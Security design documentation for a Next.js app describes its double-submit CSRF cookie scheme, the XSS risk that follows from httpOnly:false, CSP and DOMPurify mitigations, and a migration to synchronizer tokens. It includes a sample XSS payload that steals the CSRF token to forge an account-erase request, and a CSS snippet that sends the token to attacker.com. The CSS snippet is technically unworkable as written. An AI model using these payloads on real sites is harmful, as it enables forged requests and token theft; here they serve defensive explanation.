# CSRF Protection: Double-Submit Pattern & XSS Risk Analysis

## Overview

Taboot implements **defense-in-depth CSRF protection** using the double-submit cookie pattern as defined by [OWASP CSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html). This document explains the implementation, its inherent XSS exposure risks, current mitigations, and migration path to a more secure pattern.

**Status**: Production-ready with documented trade-offs
**Primary Risk**: XSS vulnerability can compromise CSRF protection
**Migration Target**: Synchronizer Token Pattern (encrypted server-side tokens)

---

## Table of Contents

1. [Double-Submit Pattern Implementation](#double-submit-pattern-implementation)
2. [Why httpOnly: false is Required](#why-httponly-false-is-required)
3. [XSS Exposure Risks](#xss-exposure-risks)
4. [Current Mitigations](#current-mitigations)
5. [Identified Gaps](#identified-gaps)
6. [Migration Path: Synchronizer Token Pattern](#migration-path-synchronizer-token-pattern)
7. [Testing & Validation](#testing--validation)
8. [References](#references)

---

## Double-Submit Pattern Implementation

### Core Mechanism

The double-submit pattern defends against CSRF by requiring two copies of the same token:

1. **Cookie**: Server sets CSRF token in cookie (readable by JavaScript)
2. **Header**: Client reads cookie, includes value in `x-csrf-token` header on mutations
3. **Validation**: Server verifies cookie matches header (attacker cannot forge both)

### File: `apps/web/lib/csrf.ts`

**Key Functions:**

```typescript
// Generate 32-byte cryptographically secure random token
async function generateCsrfToken(): Promise<string>

// Sign token with HMAC-SHA256 to detect tampering
async function signToken(token: string): Promise<string>

// Verify signed token (constant-time comparison)
async function verifyToken(signedToken: string): Promise<boolean>

// Validate Origin/Referer headers match host
function validateOrigin(request: NextRequest): boolean

// Main middleware function
export async function csrfMiddleware(request: NextRequest): Promise<NextResponse>
```

**Cookie Configuration:**

```typescript
const CSRF_TOKEN_COOKIE_NAME =
  process.env.NODE_ENV === 'production'
    ? '__Host-taboot.csrf'  // Secure prefix (requires HTTPS + Secure flag)
    : 'taboot.csrf';        // Dev-friendly (allows HTTP)

response.cookies.set(CSRF_TOKEN_COOKIE_NAME, token, {
  httpOnly: false,        // ❗ MUST be false for double-submit pattern
  secure: process.env.NODE_ENV === 'production',
  sameSite: 'lax',
  path: '/',
  maxAge: 60 * 60 * 24,   // 24 hours
});
```

**Protected Methods**: POST, PUT, PATCH, DELETE (all state-changing operations)

**Excluded Routes**: Read-only endpoints (e.g., `/api/auth/session`, `/api/health`, `/api/test`)

### Defense-in-Depth Layers

Taboot implements **three layers** of CSRF protection:

1. **SameSite='lax' Cookies** (configured in `@taboot/auth`)
   - First line of defense against cross-origin requests
   - Browser enforces cookie not sent on cross-site POST requests

2. **Double-Submit Cookie Pattern** (this implementation)
   - Requires matching token in cookie AND header
   - HMAC-SHA256 signed tokens prevent tampering

3. **Origin/Referer Header Validation** (proxy-aware)
   - Validates request origin matches expected host
   - Respects `TRUST_PROXY` for reverse proxy deployments

---

## Why httpOnly: false is Required

### Technical Necessity

The double-submit pattern **requires JavaScript to read the cookie** to include the token in the request header:

```typescript
// apps/web/lib/csrf-client.ts
function getCsrfTokenFromCookie(): string | null {
  const cookies = document.cookie.split(';');
  // Find and extract CSRF cookie value
  // ...
}

export function withCsrfToken(options: RequestInit = {}): RequestInit {
  const token = getCsrfTokenFromCookie();
  return {
    ...options,
    headers: {
      ...options.headers,
      'x-csrf-token': token,  // Client includes token from cookie
    },
  };
}
```

**Why This Matters:**

- `httpOnly: true` → JavaScript cannot read cookie → Client cannot include token in header
- `httpOnly: false` → JavaScript CAN read cookie → Client includes token in header
- **Trade-off**: Necessary functionality vs. XSS exposure

### Alternative Rejected: Automatic Header Emission

**Previous approach** (removed in FIX 5):

```typescript
// REMOVED: Exposes token in response headers
response.headers.set(CSRF_TOKEN_HEADER_NAME, token);
```

**Why removed**:
- Increases token exposure surface (logs, caches, debugging tools)
- Not necessary if client reads from cookie
- Reduces information leakage in development environments

---

## XSS Exposure Risks

### Primary Attack Vector

**If an XSS vulnerability exists** in the application, an attacker can:

1. **Read CSRF token** from JavaScript-accessible cookie
2. **Forge authenticated requests** on behalf of the victim
3. **Bypass CSRF protection** by including correct token

**Example Attack Scenario:**

```javascript
// Injected XSS payload (hypothetical)
<script>
  // 1. Read CSRF token from cookie
  const csrfToken = document.cookie
    .split(';')
    .find(c => c.includes('taboot.csrf'))
    ?.split('=')[1];

  // 2. Send authenticated request with token
  fetch('/api/users/123/erase', {
    method: 'POST',
    headers: {
      'x-csrf-token': csrfToken,
    },
  });
</script>
```

### Severity Assessment

**Impact**: High (complete bypass of CSRF protection)
**Likelihood**: Low (depends on presence of XSS vulnerability)
**Overall Risk**: Medium (mitigated by XSS defenses)

**Key Insight**: Double-submit pattern is **XSS-dependent**. If XSS exists, CSRF protection fails.

---

## Current Mitigations

Taboot implements **multiple layers** to prevent XSS and limit CSRF token exposure:

### 1. Content Security Policy (CSP)

**File**: `apps/web/middleware.ts`

```typescript
const cspConfig = {
  'default-src': "'self'",
  'script-src': "'self' 'nonce-{random}' https://app.posthog.com https://vercel.live https://*.sentry.io",
  'style-src': "'self' 'unsafe-inline'",  // ⚠️ Gap: Tailwind requires this
  'img-src': "'self' data: https:",
  'font-src': "'self' data:",
  'connect-src': "'self' https://*.posthog.com https://*.sentry.io https://*.ingest.sentry.io",
  'frame-ancestors': "'none'",
  'base-uri': "'self'",
  'form-action': "'self'",
  'upgrade-insecure-requests': '',
};
```

**Protection**:
- `script-src 'nonce-{random}'`: Inline scripts blocked unless they include request-specific nonce
- `frame-ancestors 'none'`: Prevents clickjacking
- `base-uri 'self'`: Prevents base tag injection

**See Also**: `apps/web/docs/CSP_SECURITY.md` for detailed CSP documentation

### 2. Input Sanitization

**File**: `apps/web/lib/sanitize.ts`

```typescript
/**
 * Sanitize HTML using DOMPurify to prevent XSS.
 * Allows safe subset of HTML tags and attributes.
 */
export function sanitizeHtml(dirty: string, options?: SanitizeOptions): string {
  return DOMPurify.sanitize(dirty, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br', 'ul', 'ol', 'li'],
    ALLOWED_ATTR: ['href', 'title', 'target', 'rel'],
    ALLOWED_URI_REGEXP: /^(?:(?:https?|mailto):|[^a-z]|[a-z+.\-]+(?:[^a-z+.\-:]|$))/i,
    ...options,
  });
}
```

**Protection**:
- DOMPurify removes unsafe HTML constructs
- Whitelist of allowed tags/attributes
- URL validation for links

**Tests**: `apps/web/lib/__tests__/sanitize.test.ts`

### 3. React Automatic Escaping

**Framework-level protection**:
- React automatically escapes all JSX interpolations
- Prevents most common XSS vectors (e.g., `<div>{userInput}</div>`)

**Dangerous patterns avoided**:
- `dangerouslySetInnerHTML` (only used for trusted content with explicit review)
- Direct DOM manipulation (`element.innerHTML = ...`)

### 4. Additional Security Headers

```typescript
const securityHeaders = {
  'X-Content-Type-Options': 'nosniff',     // Prevent MIME sniffing
  'X-Frame-Options': 'DENY',               // Prevent clickjacking
  'Referrer-Policy': 'strict-origin-when-cross-origin',
  'Permissions-Policy': 'camera=(), microphone=(), geolocation=()',
};
```

---

## Identified Gaps

### 1. CSP Gap: style-src 'unsafe-inline'

**Issue**: Tailwind CSS requires `'unsafe-inline'` for dynamic styles

**Risk**: Moderate - Attacker with XSS could inject malicious styles

**Why Required**:
- Tailwind generates utility classes dynamically
- No way to pre-generate all CSS combinations
- Hash-based CSP impractical for Tailwind's dynamic nature

**Potential Attack**:
```html
<style>
  /* Exfiltrate data via background-image */
  body { background-image: url('https://attacker.com/?token=' + csrfToken); }
</style>
```

**Current Mitigation**:
- CSP `script-src` still blocks script-based XSS (primary attack vector)
- Style injection alone cannot read JavaScript-accessible cookies

**Future Options**:
- Migrate to CSS-in-JS with nonce support (e.g., styled-components, emotion)
- Use CSS Modules with hash-based CSP
- Pre-generate static CSS (defeats Tailwind's utility)

### 2. Third-Party Analytics Scripts

**Issue**: External scripts from PostHog, Sentry, Vercel are trusted

**Risk**: Low - Compromised CDN could inject malicious scripts

**Current Mitigation**:
- CSP restricts to specific domains (not wildcard)
- Nonce-based script authorization
- Subresource Integrity (SRI) hashes (not yet implemented)

**Future Improvement**:
```typescript
<script
  nonce={nonce}
  src="https://cdn.sentry.io/..."
  integrity="sha384-..."  // Add SRI hash
  crossorigin="anonymous"
/>
```

### 3. CSRF Token Cache/Log Exposure

**Issue**: Token visible in:
- Browser DevTools → Cookies panel
- Browser DevTools → Network panel (headers)
- Server logs (if header logging enabled)

**Risk**: Low - Requires local access or compromised logging infrastructure

**Current Mitigation**:
- Tokens expire after 24 hours
- HMAC-signed to detect tampering
- Logged as `[REDACTED]` in production logs (pattern-based redaction)

**Not a Priority**: Local access implies broader compromise; log exposure requires infrastructure breach

---

## Migration Path: Synchronizer Token Pattern

### Why Migrate?

**Double-Submit Pattern Weakness**: XSS vulnerability compromises CSRF protection

**Synchronizer Token Pattern Strength**: XSS cannot forge server-side encrypted tokens

### How Synchronizer Token Pattern Works

1. **Server generates encrypted token** and stores in session
2. **Server embeds token in HTML** (meta tag or form hidden field)
3. **Client reads token from DOM** and includes in mutation requests
4. **Server validates** token matches session-stored value

**Key Difference**: Token not stored in JavaScript-accessible cookie, so XSS cannot read it from `document.cookie`

### Implementation Plan

#### Phase 1: Server-Side Token Storage (1-2 days)

**Current**: Token stored in cookie only
**Target**: Token stored in Redis session with encryption

```typescript
// packages-ts/auth/src/csrf.ts (new file)
import { createCipheriv, createDecipheriv, randomBytes } from 'crypto';

interface CsrfSession {
  token: string;
  expiresAt: number;
}

export async function generateCsrfToken(sessionId: string): Promise<string> {
  const token = randomBytes(32).toString('base64url');
  const expiresAt = Date.now() + 24 * 60 * 60 * 1000;  // 24 hours

  // Store in Redis with session ID
  await redis.setex(
    `csrf:${sessionId}`,
    60 * 60 * 24,
    JSON.stringify({ token, expiresAt })
  );

  // Encrypt token before sending to client
  const encrypted = encryptToken(token, process.env.CSRF_SECRET!);
  return encrypted;
}

export async function validateCsrfToken(
  sessionId: string,
  clientToken: string
): Promise<boolean> {
  const stored = await redis.get(`csrf:${sessionId}`);
  if (!stored) return false;

  const { token, expiresAt } = JSON.parse(stored) as CsrfSession;
  if (Date.now() > expiresAt) return false;

  // Decrypt client token and compare
  const decrypted = decryptToken(clientToken, process.env.CSRF_SECRET!);
  return timingSafeEqual(Buffer.from(token), Buffer.from(decrypted));
}
```

#### Phase 2: HTML Meta Tag Embedding (1 day)

**Current**: Token read from cookie
**Target**: Token read from `<meta>` tag

```tsx
// apps/web/app/layout.tsx
export default async function RootLayout({ children }) {
  const session = await auth.api.getSession({ headers: headers() });
  const csrfToken = session ? await generateCsrfToken(session.id) : null;

  return (
    <html>
      <head>
        {csrfToken && <meta name="csrf-token" content={csrfToken} />}
      </head>
      <body>{children}</body>
    </html>
  );
}
```

```typescript
// apps/web/lib/csrf-client.ts
function getCsrfTokenFromMeta(): string | null {
  const meta = document.querySelector('meta[name="csrf-token"]');
  return meta?.getAttribute('content') ?? null;
}

export function withCsrfToken(options: RequestInit = {}): RequestInit {
  const token = getCsrfTokenFromMeta();  // Read from meta tag, not cookie
  if (!token) {
    console.warn('CSRF token not found in meta tag. Request may be rejected.');
    return options;
  }

  return {
    ...options,
    headers: {
      ...options.headers,
      'x-csrf-token': token,
    },
  };
}
```

#### Phase 3: Remove Cookie-Based Token (0.5 days)

**Current**: Cookie with `httpOnly: false`
**Target**: No CSRF cookie (token only in server session + HTML meta tag)

```typescript
// apps/web/lib/csrf.ts
export async function csrfMiddleware(request: NextRequest): Promise<NextResponse> {
  const response = NextResponse.next();

  // No longer set CSRF cookie - token embedded in HTML instead
  // Skip cookie removal logic...

  return response;
}
```

#### Phase 4: Update Validation Logic (1 day)

**Current**: Validate cookie matches header
**Target**: Validate header matches Redis session

```typescript
// apps/web/lib/csrf.ts
async function validateCsrfToken(request: NextRequest): Promise<boolean> {
  const session = await auth.api.getSession({ headers: request.headers });
  if (!session) return false;

  const headerToken = request.headers.get(CSRF_TOKEN_HEADER_NAME);
  if (!headerToken) {
    logger.warn('CSRF: Missing token in header', { url: request.url });
    return false;
  }

  // Validate token matches server-side session
  return await validateCsrfToken(session.id, headerToken);
}
```

#### Phase 5: Testing & Rollout (2-3 days)

**Test Coverage**:
- Unit tests: Token generation, encryption, validation
- Integration tests: CSRF protection on mutation endpoints
- Browser tests: Token retrieval from meta tag
- Security tests: XSS cannot forge tokens

**Rollout Strategy**:
1. Deploy with feature flag (`CSRF_PATTERN=synchronizer`)
2. Monitor error rates for CSRF validation failures
3. Gradually enable for 10% → 50% → 100% of traffic
4. Remove double-submit code after 2 weeks of stable synchronizer pattern

**Total Effort**: ~5-7 days for full migration

### Benefits of Synchronizer Token Pattern

| Aspect | Double-Submit | Synchronizer Token |
|--------|---------------|-------------------|
| **XSS Resistance** | ❌ Fails if XSS exists | ✅ XSS cannot read server token |
| **Cookie Security** | ⚠️ Requires `httpOnly: false` | ✅ No CSRF cookie needed |
| **Implementation** | ✅ Simpler (stateless) | ⚠️ Requires Redis/session store |
| **Performance** | ✅ No DB lookup | ⚠️ Redis lookup per validation |
| **OWASP Recommended** | ✅ Tier 2 defense | ✅ Tier 1 defense |

---

## Testing & Validation

### Unit Tests

**File**: `apps/web/lib/__tests__/csrf.test.ts`

```bash
pnpm --filter @taboot/web test lib/__tests__/csrf.test.ts
```

**Coverage**:
- Token generation (randomness, uniqueness)
- HMAC signing and verification
- Origin/Referer validation
- Proxy-aware host detection

### Integration Tests

**File**: `apps/web/lib/__tests__/csrf-client.test.ts`

```bash
pnpm --filter @taboot/web test lib/__tests__/csrf-client.test.ts
```

**Coverage**:
- Client-side token retrieval from cookies
- Automatic token inclusion in mutation requests
- Safe method exclusion (GET, HEAD, OPTIONS)

### Manual Testing

**Test CSRF Protection**:

```bash
# 1. Start dev server
pnpm --filter @taboot/web dev

# 2. Open browser DevTools → Application → Cookies
# 3. Verify CSRF cookie present after visiting site

# 4. Try mutation WITHOUT token (should fail)
curl -X POST http://localhost:4211/api/auth/sign-out \
  -H "Cookie: taboot.csrf=fake_token"
# Expected: 403 Forbidden (missing x-csrf-token header)

# 5. Try mutation WITH mismatched token (should fail)
curl -X POST http://localhost:4211/api/auth/sign-out \
  -H "Cookie: taboot.csrf=real_token_from_browser" \
  -H "x-csrf-token: different_token"
# Expected: 403 Forbidden (token mismatch)

# 6. Try mutation WITH correct token (should succeed)
# Get token from browser DevTools, then:
curl -X POST http://localhost:4211/api/auth/sign-out \
  -H "Cookie: taboot.csrf=<token_from_browser>" \
  -H "x-csrf-token: <same_token_from_browser>"
# Expected: 200 OK (or appropriate success response)
```

### Security Testing

**Test XSS Protection**:

```bash
# 1. Attempt to inject script via user input
curl -X POST http://localhost:4211/api/profile \
  -H "x-csrf-token: <valid_token>" \
  -d '{"name": "<script>alert(1)</script>"}'

# 2. Verify response sanitizes input (script tags removed)
# Check: Response should show escaped/sanitized HTML
```

**Test CSP Enforcement**:

```bash
# 1. Open browser DevTools → Console
# 2. Try to execute inline script without nonce
document.body.innerHTML += '<script>alert("XSS")</script>';
# Expected: CSP violation error in console, script not executed
```

---

## References

### OWASP Resources

- [CSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
- [XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [Content Security Policy Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html)

### Implementation Files

- `apps/web/lib/csrf.ts` - Core CSRF middleware and validation
- `apps/web/lib/csrf-client.ts` - Client-side token retrieval
- `apps/web/middleware.ts` - CSRF middleware integration + CSP headers
- `apps/web/lib/sanitize.ts` - DOMPurify XSS sanitization
- `apps/web/docs/CSP_SECURITY.md` - Content Security Policy documentation

### Testing Files

- `apps/web/lib/__tests__/csrf.test.ts` - CSRF unit tests
- `apps/web/lib/__tests__/csrf-client.test.ts` - Client-side token tests
- `apps/web/lib/__tests__/sanitize.test.ts` - Input sanitization tests

### Related Documentation

- `docs/ADMIN_OPERATIONS.md` - Admin authorization patterns
- `docs/SOFT_DELETE_CONTEXT.md` - Soft delete audit trail
- `CLAUDE.md` - Security configuration (CSRF_SECRET, rate limiting)

---

## Summary

**Current State**: Production-ready double-submit CSRF protection with multiple XSS mitigations

**Primary Risk**: XSS vulnerability could compromise CSRF protection (inherent to double-submit pattern)

**Recommended Action**: Migrate to Synchronizer Token Pattern when resources allow (~5-7 days effort)

**Short-Term**: Continue with current implementation, focusing on preventing XSS through:
- Strict CSP enforcement
- Input sanitization (DOMPurify)
- React automatic escaping
- Regular security audits

**Long-Term**: Implement Synchronizer Token Pattern for XSS-independent CSRF protection
